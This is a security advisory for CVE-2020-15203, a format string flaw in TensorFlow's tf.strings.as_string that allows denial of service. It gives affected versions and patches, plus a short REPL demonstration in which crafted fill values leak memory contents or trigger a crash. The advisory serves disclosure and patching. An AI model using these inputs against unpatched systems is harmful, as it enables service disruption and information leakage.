# [H] Denial of Service in Tensorflow

## Summary
Severity: High
Advisory: GHSA-xmq7-7fxm-rr79
CVE: CVE-2020-15203
CWE: CWE-134, CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2020-09-25
Source: https://github.com/advisories/GHSA-xmq7-7fxm-rr79
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <1.15.4
- PyPI: `tensorflow` — affected >=2.0.0 <2.0.3
- PyPI: `tensorflow` — affected >=2.1.0 <2.1.2
- PyPI: `tensorflow` — affected >=2.2.0 <2.2.1
- PyPI: `tensorflow` — affected >=2.3.0 <2.3.1
- PyPI: `tensorflow-cpu` — affected >=0 <1.15.4
- PyPI: `tensorflow-cpu` — affected >=2.0.0 <2.0.3
- PyPI: `tensorflow-cpu` — affected >=2.1.0 <2.1.2
- PyPI: `tensorflow-cpu` — affected >=2.2.0 <2.2.1
- PyPI: `tensorflow-cpu` — affected >=2.3.0 <2.3.1
- PyPI: `tensorflow-gpu` — affected >=0 <1.15.4
- PyPI: `tensorflow-gpu` — affected >=2.0.0 <2.0.3
- PyPI: `tensorflow-gpu` — affected >=2.1.0 <2.1.2
- PyPI: `tensorflow-gpu` — affected >=2.2.0 <2.2.1
- PyPI: `tensorflow-gpu` — affected >=2.3.0 <2.3.1

## Details
### Impact
By controlling the `fill` argument of [`tf.strings.as_string`](https://www.tensorflow.org/api_docs/python/tf/strings/as_string), a malicious attacker is able to trigger a format string vulnerability due to the way the internal format use in a `printf` call is constructed: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/as_string_op.cc#L68-L74

This can result in unexpected output:
```python
In [1]: tf.strings.as_string(input=[1234], width=6, fill='-')                                                                     
Out[1]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['1234  '], dtype=object)>                                              
In [2]: tf.strings.as_string(input=[1234], width=6, fill='+')                                                                     
Out[2]: <tf.Tensor: shape=(1,), dtype=string, numpy=array([' +1234'], dtype=object)> 
In [3]: tf.strings.as_string(input=[1234], width=6, fill="h")                                                                     
Out[3]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['%6d'], dtype=object)> 
In [4]: tf.strings.as_string(input=[1234], width=6, fill="d")                                                                     
Out[4]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['12346d'], dtype=object)> 
In [5]: tf.strings.as_string(input=[1234], width=6, fill="o")
Out[5]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['23226d'], dtype=object)>
In [6]: tf.strings.as_string(input=[1234], width=6, fill="x")
Out[6]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['4d26d'], dtype=object)>
In [7]: tf.strings.as_string(input=[1234], width=6, fill="g")
Out[7]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['8.67458e-3116d'], dtype=object)>
In [8]: tf.strings.as_string(input=[1234], width=6, fill="a")
Out[8]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['0x0.00ff7eebb4d4p-10226d'], dtype=object)>
In [9]: tf.strings.as_string(input=[1234], width=6, fill="c")
Out[9]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['\xd26d'], dtype=object)>
In [10]: tf.strings.as_string(input=[1234], width=6, fill="p")
Out[10]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['0x4d26d'], dtype=object)>
In [11]: tf.strings.as_string(input=[1234], width=6, fill='m') 
Out[11]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['Success6d'], dtype=object)>
```

However, passing in `n` or `s` results in segmentation fault.

### Patches
We have patched the issue in 33be22c65d86256e6826666662e40dbdfe70ee83 and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xmq7-7fxm-rr79
- https://nvd.nist.gov/vuln/detail/CVE-2020-15203
- https://github.com/tensorflow/tensorflow/commit/33be22c65d86256e6826666662e40dbdfe70ee83
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2020-283.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2020-318.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2020-126.yaml
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.3.1
- http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00065.html
